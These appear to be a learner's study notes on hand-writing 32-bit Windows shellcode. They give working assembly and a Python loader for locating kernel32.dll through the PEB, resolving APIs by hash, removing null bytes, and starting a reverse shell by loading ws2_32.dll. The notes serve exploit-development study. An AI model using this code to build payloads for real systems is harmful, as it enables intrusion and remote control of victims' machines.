# x86 Calling Conventions
x86 calling conventions define:
- How arguments are passed to a function.
- Which registers the callee must preserve for the caller.
- How the stack frame needs to be prepared before the call.
- How the stack frame needs to be restored after the call.

 These conventions are critical to build a working shellcode.

> **Win32 API** uses the `__stdcall` while C runtime uses the `__cdecl` calling convention
> Both: callee pushes parameters on the stack in reverse order
> stdcall: stack is cleaned by callee
> cdecl: stack is cleaned by caller
> **For any calling convention** on a 32-bit system, the EAX, EDX, and ECX registers are considered volatile (likely to be destroyed during a function call)
> EAX typically holds the return value (or address) from system calls


# The System Call Problem (Native API)
Syscalls, the **Native API** in Windows exported by ntdll.dll, are a set of functions that allow kernel space functionality (I/O, thread sync, sockets, etc.) to be called from user space. Shellcodes lean heavily on using syscall functionality. However, Windows kernel-level functions are identified by syscall numbers that tend to change between releases (Linux, in contrast, is static). In addition, the Windows syscall interface doesn't expose all kernel level functionality, such as sockets. 

Therefore, syscalls can't be used for portability and full functionality. We are instead forced to use the **Windows API**, a higher level API utilizing Native API functionality, which is exported by DLLs that only get mapped at runtime.

kernel32.dll exposes functions that can load other libraries and locate the functions we need.
1. `LoadLibraryA` : loads DLLs
2. `GetModuleHandleA` : gets the base address of a loaded DLL
3. `GetProcAddress` : resolves symbols (function within a DLL)

But... the base address of kernell32.dll is not initially known in an exploit environment, so we will need to locate it, resolve function addresses from it, and do the same for any other required DLLs.

# Finding kernel32.dll
kernel32.dll is nearly guaranteed to be loaded into any given process since its APIs are required for any processes to run. There are multiple ways to retrieve to kernel32 base address, like the SEH and "Top Stack" methods, but the most portable (and only one which works on recent Windows versions) is the PEB Method.

### PEB Method
> The linked lists mentioned below are implemented as substructures contained within each `_LDR_DATA_TABLE_ENTRY`, which are unique records for every module loaded into a PEB. The values in `_PEB_LDR_DATA` are the "start" nodes for each linked list.

A PEB structure is given for every running process and is pointed to by any of its given TEBs
1. Attach WinDbg to process
2. Dump the TEB to get the PEB location: `dt nt!_TEB @$teb` -> read 0x030
3. Dump the PEB to get the module "LDR" address: `dt nt!_PEB XXXXXXXX`
4. Dump the LDR data : `dt _PEB_LDR_DATA XXXXXXXX`
	1. Where LDR is a pointer to a struct containing start nodes to 3 linked lists (InLoad | InMemory | InInit Order) of loaded modules 
5. Dump the `_LIST_ENTRY` of inInitialization : `dt _LIST_ENTRY xxxxxxxx`
6. Dump the LDR Table data of the first entry given in the InInit List: `dt _LDR_DATA_TABLE_ENTRY (0xXXXXXXXX - 0x10)`
	1. The `_LIST_ENTRY` is a linked list substructure contained within `_LDR_DATA_TABLE_ENTRY`
	2. this struct isn't given from walking through the PEB/TEB struct in WinDbg, needs to be known beforehand (given by course material). If walking the InInitializationOrderLinks, then it resides 0x10 before the `_LIST_ENTRY` address (on x32 systems, and 0x20 before on x64 systems)
 7.  Walk the Flinks until we find the BaseImage of `KERNEL32.DLL`
 8. Remember that the BaseDllName `_UNICODE_STRING` Buffer member, which contains a pointer to the string name in memory, is at offset 0x04. (0x02c + 0x04 = 0x030, offset of string name for shellcode purposes)

### Assembling the Shellcode
Use Keystone Engine and CTypes library in Python to build a script that will:
- Turn assembly into opcodes
- Allocate memory for the shellcode
- Copy the shellcode to allocated memory
- Execute the shellcode
[[Keystone Engine]]
```
import ctypes, struct
from keystone import *


### assembly code ###
CODE = (
        "start:                  " #
        "   int3                ;" # DEBUGGING PURPOSES: Interrupt exec to attach debugger
        "   mov ebp, esp        ;" # move up the base pointer to imitate a function call
        "   sub esp, 60h        ;" # move up the stack pointer to avoid stack clobbering

        "find_kernel32:          " #
        "   xor ecx, ecx        ;" # zero out ecx
        "   mov esi,fs:[ecx+30h];" # get the PEB address (30h into the TEB)
        "   mov esi,[esi+0Ch]   ;" # get the Ldr address from PEB
        "   mov esi,[esi+1Ch]   ;" # get the InItOrder first link address from Ldr
        
        "next_module:            " #
        "   mov ebx, [esi+8h]   ;" # get the module base address of the linked entry 
        "   mov edi, [esi+20h]  ;" # get the module name
        "   mov esi, [esi]      ;" # get the flink entry
        "   cmp [edi+12*2], cx  ;" # check for null byte at word 13 (byte 26) of module name (KERNEL32.DLL)
        "   jne next_module     ;" # move on to next module if no match
        "   ret                  " #
        )


### generate shellcode ###
# init engine in x86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
sh = b""
for e in encoding:
    sh += struct.pack("B", e) # add each byte object from an unsigned char (B)
shellcode = bytearray(sh)


### makes the shellcode executable ###
# allocate mem page with PAGE_EXEC_READWRITE perms, returns a pointer
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
# tbh not sure here, but makes a ctype compatible buffer space from the shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
# move the buffer into the memory page
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))


### executes the shellcode ###
print("Shellcode located at address %s" % hex(ptr))
input("...PRESS ENTER TO EXECUTE SHELLCODE...")
# creates the thread environment for the shellcode to run
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.int(-1))
```
see https://docs.python.org/3/library/struct.html#format-characters for info on struct.pack

https://bsodtutorials.wordpress.com/2021/06/14/windows-address-translation-deep-dive-part-1/ : article about segmentation and wtf the fs/gs segment registers are pointing to.

1. copy this to Windows machine, save as python file
2. run it from cmd : `python SCRIPT.py`
3.  Continue execution
4. set breakpoint at compare
5. `g` until we find a `du eip` that matches `KERNEL32.DLL`, step through to make sure the code catches this case
	1. Note that WinDbg will resolve the full path name under BaseDllName, but only the module name (`KERNEL32.DLL`) is actually in memory
6. .... finish this another time

# Resolving Symbols
At this point we can find `kernel32.dll` but we will crash the program due to not properly ending the process. We need to resolve APIs  functions exported by the module like `TerminateProcess` and, ideally before that, `GetProcAddress`. Rather than relying on the API, we can create our own "GetProcAddress" equivalent by traversing the Export Address Table (EAT) of a loaded DLL (which is pointed to by the Export Directory Table)

> [[Portable Executable (PE)]] : see doxygen link for struct docs
> symbols : function names and their starting memory addresses.
> VMA/RVA : Virtual Memory Address/Relative Virtual Address, in this case, of the export-arrays function and the AddressOfNames list
### Export Directory Table Method
A method to resolve symbols from kernel32.dll and other DLLs

All DLL's that export functions have an Export Directory Table that contains:
- Number of exported symbols
- Relative Virtual Address (RVA) of the export-functions array (equivalent to EAT?), pointed to by AddressOfFunctions
- RVA of the export-names array, pointed to by AddressOfNames
- RVA of the export-ordinals array, pointed to by AddressOfNameOrdinals

EDT Structure
```
typedef struct _IMAGE_EXPORT_DIRECTORY {
  DWORD Characteristics;
  DWORD TimeDateStamp;
  WORD MajorVersion;
  WORD MinorVersion;
  DWORD Name;
  DWORD Base;
  DWORD NumberOfFunctions;
  DWORD NumberOfNames;
  DWORD AddressOfFunctions;
  DWORD AddressOfNames;
  DWORD AddressOfNameOrdinals;
}
```
![[8zBMu.gif]]
To find the address of a specific function we need to traverse these 3 arrays, using the name to find the ordinal, and the ordinal to find the function address (Why this all isn't just put into 1 array, I don't know...):
1. Resolve symbol by name, looking for it in `AddressOfNames` array and noting its index "i"
2. Use this "i" to index into `AddressOfNameOrdinals` array and noting its value as "j"
3. Use this "j" to index into `AddressOfFunction` array, getting a function RVA
4. Add the Relative Virtual Address to the Base (DLL) Address to get a true Virtual Memory Address: RVA + BA = VMA (Virtual Memory Address)

In this example, we optimize the shellcode by using a hashing function that turns the string name we're searching for into a four byte hash allowing us to reuse the assembly for any given symbol name.

Then, once the `LoadLibraryA` symbol is resolved we can load in any old arbitrary modules.

### Working with the Export Names Array
EDT contains relative addresses, but we can get the VMA using the DLL base address stored in EBX from the `find_kernel32:` section of our shellcode.

> Structures: https://www.aldeid.com/wiki/PE-Portable-executable
> teb -> peb -> ldr chain -> module base
> module base -> DOS Header -> PE Header -> Export Directory Table -> NumberOfNames, AddressOfNames 

shellcode.py updates:
```
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   sub   esp, 0x200                ;"  #   More space to avoid stack clobber
    "   call  find_kernel32             ;"  #
    "   call  find_function             ;"  #

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
...
...
    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Directory Table RVA
    "   add   edi, ebx                  ;"  #   Export Directory Table VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name
    
    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #
...
```


`find_function:`

> ebx now stores kernel32 base, thanks to `find_kernel32:`
1. `pushad` : stores stack values
2. `move eax,[ebx+0x3c]` : get PE header address stored at 0x3c offset from module base (in the PE DOS header)
3. `mov edi,[ebx+eax+0x78]` : get the RVA of the export-functions array from offset 0x78 in the PE header (base addr + PE header RVA + offset)
4. `add edi,ebx` : add the previous RVA to the base address to get the VMA of export-functions
5. `mov ecx,[edi+0x18]` : get NumberOfNames (num of exported symbols, will be used as a counter to parse AddressOfNames) from offset 0x18 in VMA
6. `mov eax,[edi+0x20]` : get RVA of AddressOfNames array from offset in export-functions
7. `add eax,ebx` : add the AddressOfNames RVA to the base address to get VMA of AddressOfNames
8. `mov [ebp-4],eax` : save AddressOfNames on the stack


`find_function_loop:`

1. `jecxz find_function_finished` : jump if ecx (holding NumberOfNames counter) hits 0, meaning we hit the end of the array
2. `dec ecx` : decrement names counter
3. `mov eax, [ebp-4]` : load back in AddressOfNames
4. `mov esi, [eax+ecx*4]` : AddressOfNames + NumberOfNames counter * 4 (dword size) = RVA of last function
5. `add esi, ebx` : get VMA of last function


`find_function_finished:`

1. `popad` : restore registers
2. `ret` : back to start function


Perform the full drill down to the Export Directory Tables's relative address via WinDbg for context:
1. `lm m kernel32` : in the script this is done through the PEB/TEB/LDR walk
2. `dt ntdll!_IMAGE_DOS_HEADER ...`, get e_lfanew
3. `dt ntdll!_IMAGE_NT_HEADERS ... + e_lfanew`
4. `dt ntdll!_IMAGE_OPTIONAL_HEADER ... + e_lfanew + 0x18`
5. inspecting the output, notice that there is a DataDirectory array field that consists of 16 _IMAGE_DATA_DIRECTORY (which is comprised of a DWORD VirtualAddress, and DWORD Size)
6. `dt ntdll!_IMAGE_DATA_DIRECTORY ... + e_lfanew + (0x18 + 0x60)` : this is the Export Directory Table
> trying this on a 64 bit system led to a slightly larger offset for the Export Directory Table, use `!dh -f kernel32` to reliably find the address of directories

Update the shellcode script and step through it to ensure that it returns the same value for the Export Directory Table
- use the interrupt to step through `t` the code, `r edi` to get Export Directory address after its been calculated
- once the `find_function_finished` section is hit `da esi` to get the ASCII function name pointed to

The above shellcode functionality finds the base address of kernel32.dll, then finds and iterates through the Export Directory Table. Next, we need a method to parse the exported symbol names to find helpful functions.


### Computing Function Name Hashes
Instead of comparing the string literals, or taking a subset of a string name to check for, we'll use a hashing algorithm to get a consistent DWORD which can be used to reliably find function names. As a DWORD check, the shellcode can be reused for any symbol (this is what most modern shellcodes use).

shellcode edits to compute hash:
```
    " hash_prep:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " hash_loop:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;" #   Check for NULL terminator
    "   jz    hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   hash_loop        ;"  #   Next iteration

    " hash_finished:             "  #
```

`hash_prep:` (bad name, should be like `hash_prep_prep`)
1. `xor eax, eax` : zero out the eax registers
2. `cdq` : zero out the edx register by equaling it to eax
3. `cld` : clears the direction flag (DF) meaning all string operations will increment the index registers, ESI (pointing to a symbol name) and EDI

`hash_loop:` (this is the actual hash compute)
1. `lodsb` : load a string byte from esi into al, increments esi afterwards (due to DF)
2. `test al, al` : bitwise AND, if al is 0 (hit null terminator) it will set ZF to 0
3. `jz hash_finished` : jump out if ZF=0 / null terminator hit
4. `ror edx, 0x0d` : perform a 13 bit rotation of the the data in edx (our accumulator which is 0 at first)
5. `add edx, eax` : add the string byte to the accumulator before moving to the next byte
6. `jmp hash_loop` : repeat for the next byte in the string

The above generates a unique (apparently no collisions) four-byte hash that can be compared against a pre-computed hash using the same method. 
The [[Python Rotation Hash]] : generate that hash using the same algorithm

Step through the assembly code again in WinDbg to ensure that the hash generated in edx during the `hash_loop` matches the pre-generated one.


### Fetching the VMA of a Function
We have the means to identify a specific function from Export Directory Table. Now, feeding the script a pre-computed hash we find the VMA, the address in memory, of that specified function. In this case, we look specifically at TerminateProcess so we can exit the hijacked process gracefully.

shellcode modifications:
```
CODE = (
    " start:                             "  #
...
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call  find_function             ;"  #
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   push  ecx                       ;"  #   uExitCode
    "   push  0xffffffff                ;"  #   hProcess
    "   call  eax                       ;"  #   Call TerminateProcess
...
    " find_function_loop:                "  #
...
    " hash_loop:                "  #
...
    " hash_finished:             "  #

    " find_function_compare:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
	"   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad
...
```

TerminateProcess docs: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess

`start:`
1. `push 0x78b5b983` : push the pre-gen hash for TerminateProcess
2. `call find_function`
3. `xor ecx, ecx` : zero out
4. `push ecx` : push uExitCode parameter tot the syscall, 0 meaning all good
5. `push 0xffffffff` : push hProcess parameter, a -1 "psuedo-handle" (interpreted as the current process handle)
6. `call eax` : call TerminateProcess using the returned VMA from find_function

`find_function_compare:`
1. `cmp edx, [esp+0x24]` : compares the generated hash to the pre-gen hash on the stack
2. `jnz find_function_loop` : if those weren't equal (ZF=1), then keep searching AddressOfNames
3. `mov edx, [edi+0x24]` : get AddressOfNameOrdinals array RVA from Export Directory Table (which edi points to)
4. `add edx, ebx` : get AddressOfNamesOrdinals VMA
5. `mov cx, [edx+2*ecx]` : overwrite index from Names array with calculated corresponding Ordinals index, Ordinals VMA + 2 (for WORD size) * Names index = VMA for equivalent index into Ordinals array
6. `mov edx, [edi+0x1c]` : get AddressOfFunctions array RVA from Export Directory Table
7. `add edx, ebx` : get AddressOfFunctions VMA
8. `mov eax, [edx+4*ecx]` : get specific function's RVA, Functions + 4 * Ordinal index (assuming 4 for DWORD ptr)
9. `add eax, ebx` : get specific function's VMA
10. `mov [esp+0x1c], eax` : Overwrite the eax value stored on stack from pushad so that it returns the specified functions address instead when popad is executed

Run again in WinDbg, set a software breakpoint at the end of `find_function_compare`, then step through. Stop once we get the VMA of the TerminateProcess function and `u eax` to confirm we see `KERNEL32!TerminateProcessStub`
Also step over the call to TerminateProcess to ensure that the shellcode exits cleanly (ntdll!KiFastSystemCallRet). Commenting out the `int3` in the shellcode and running should also result in a clean exit vs a crash.

TerminateProcess prototype: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess


We can now resolve any symbol exported by kernel32.dll. Now let's take a step back to shellcode portability.


# NULL-Free Position-Independent Shellcode (PIC)
Running the python script in WinDbg, we'll notice that some of the generated opcodes contain null bytes (particularly right at the start). This is a problem when our input is being interpreted as a string, like in any overflow context.  
  
### Avoiding Null Bytes  
Take a look at the first instruction generating null bytes:  
- `sub esp, 0x200` : can be converted to an add with a negative value -> `add esp, 0xfffffe00` (WinDbg: `? 0x0 - 0x200`)  
- Repeat this process for arithmetic generated null bytes  
- How do we avoid null bytes generated by call instructions?  
  
### Position-Independent Shellcode  
Call instructions will either generate a near call with a relative offset, or a far call with an absolute address.  
While we could move all the functions above the corresponding call (to generate negative relative offsets), a more versatile solution is to dynamically find the absolute address of each function and store it in a register. This is what's usually done by a decoder with an encoded payload.  
> The easy solution would be to immediately `jmp` down to a `main:` logic function and only call upwards functions from there
  
`start` code modifications and dynamic address call to `find_function`:
```  
CODE = (  
    " start:                             "  #  
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!  
    "   mov   ebp, esp                  ;"  #  
    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes  
  
    " find_kernel32:                     "  #  
    "   xor   ecx, ecx                  ;"  #   ECX = 0  
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])  
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr  
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder  
  
    " next_module:                       "  #  
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address  
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name  
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)  
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00?  
    "   jne   next_module               ;"  #   No: try next module  
...  
    " find_function_shorten:             "  #  
    "   jmp find_function_shorten_bnc   ;"  #   Short jump  
  
    " find_function_ret:                 "  #  
    "   pop esi                         ;"  #   POP the return address from the stack  
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage  
    "   jmp resolve_symbols_kernel32    ;"  #  
  
    " find_function_shorten_bnc:         "  #    
    "   call find_function_ret          ;"  #   Relative CALL with negative offset  
  
    " find_function:                     "  #  
    "   pushad                          ;"  #   Save all registers  
...  
```  
  
1. `find_kernel32:` has moved right after the first two `start` instructions, therefore no longer requiring an explicit call.  The rest of `start` is moved around, shown later.
2. `find_function_shorten:` executes after `next_module` resolves, contains a short jump down to `find_function_shorten_bnc` which is small enough to not contain null bytes.  
3. `find_function_shorten_bnc:` immediately calls to `find_function_ret` (at a negative offset location), storing a return address to the stack pointing to the first instruction of `find_function`.  
4. `find_function_ret:` pops that return value off the stack and moves it into a another arbitrary stack location for future use (using `call dword ptr [ebp+0x04]`), then short jumps down to another function.  


`start` code functionality new functions:
```  
...  
    " find_function_finished:            "  #  
    "   popad                           ;"  #   Restore registers  
    "   ret                             ;"  #  
  
    " resolve_symbols_kernel32:              "  
    "   push  0x78b5b983                ;"  #   TerminateProcess hash  
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function  
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage  
  
    " exec_shellcode:                    "  #  
    "   xor   ecx, ecx                  ;"  #   Null ECX  
    "   push  ecx                       ;"  #   uExitCode  
    "   push  0xffffffff                ;"  #   hProcess  
    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess  
```  
  
5. `resolve_symbols_kernel32:` responsible for the `find_function` call, previously in `start`, but now using the address from the stack `call dword ptr [ebp+0x04]`  
6. `exec_shellcode:` performs the syscall function to TerminateProcess, previously in `start` 
# Reverse Shell  
A common shellcode expoloit is the reverse shell. Most of the required APIs are exported by `Ws2_32.dll`.  
The initialization chain for the connection will be:  
Initialize Winsock DLL via WSAStartup -> WSASocketA to create the socket -> WSAConnect to establish the connection.  
CreateProcessA to start cmd.exe (from kernel32.dll)  
  
### Loading ws2_32.dll and Resolving Symbols  
We already loaded kernel32 the hard way, which gives us access to it's functions, like LoadLibraryA, which can be used to load ws2_32.dll. Its functions can then be found using the same method we built before (or alternatively GetProcAddress also from kernel32).  
  
Loading ws2_32.dll and its symbols:  
```  
   " find_function_finished:            "  #  
    "   popad                           ;"  #   Restore registers  
    "   ret                             ;"  #  
  
    " resolve_symbols_kernel32:          "  
    "   push  0x78b5b983                ;"  #   TerminateProcess hash  
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function  
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage  
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash  
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function  
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage  
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash  
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function  
    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage  
...  
```  
  
`resolve_symbols_kernel32:`  
These modifications are repetitive and probably don't need deep explanations  
1. `push` pre-generated hashes  
2. `call` our `find_function` returning the address to eax  
3. `mov` this function address to the stack for later  
4. Repeat for each function  
  
  
Call to LoadLibraryA:  
```  
 " load_ws2_32:                       "  #  
    "   xor   eax, eax                  ;"  #   Null EAX  
    "   mov   ax, 0x6c6c                ;"  #   Move the end of the string in AX  
    "   push  eax                       ;"  #   Push EAX on the stack with string NULL terminator  
    "   push  0x642e3233                ;"  #   Push part of the string on the stack  
    "   push  0x5f327377                ;"  #   Push another part of the string on the stack  
    "   push  esp                       ;"  #   Push ESP to have a pointer to the string  
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA  
```  
  
`load_ws2_32:`  
1. `xor eax, eax`  
2. `mov ax, 0x6c6c` : move "ll" (from "ws2_32.dll") into ax, the rest of the eax register will be 0 creating the string null terminator  
3. `push eax` : move `ll\0\0` to the stack  
4. `push 0x642e3233` : move the second byte "32.d" to the stack  
5. `push 0x5f327377` : move the first byte "ws2_" to the stack  
6. `push esp` : push the pointer to this string on the stack  
7. `call dword ptr[ebp+0x14]` : call LoadLibraryA  
  
  
Finding symbols in ws2_32.dll:  
```  
    " resolve_symbols_ws2_32:            "  
    "   mov   ebx, eax                  ;"  #   Move the base address of ws2_32.dll to EBX  
    "   push  0x3bfcedcb                ;"  #   WSAStartup hash  
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function  
    "   mov   [ebp+0x1C], eax           ;"  #   Save WSAStartup address for later usage  
...  
```  
  
`resolve_symbols_ws2_32:`  
1. `mov ebx, eax` : move the ws2_32.dll address into ebx  
2. `push 0x3bfcedcb` : push pre-gen hash of WSAStartup  
3. `call dword ptr [ebp+0x04]` : call our find_function  
4. mov [ebp+0x1c], eax` : store the base module address to the stack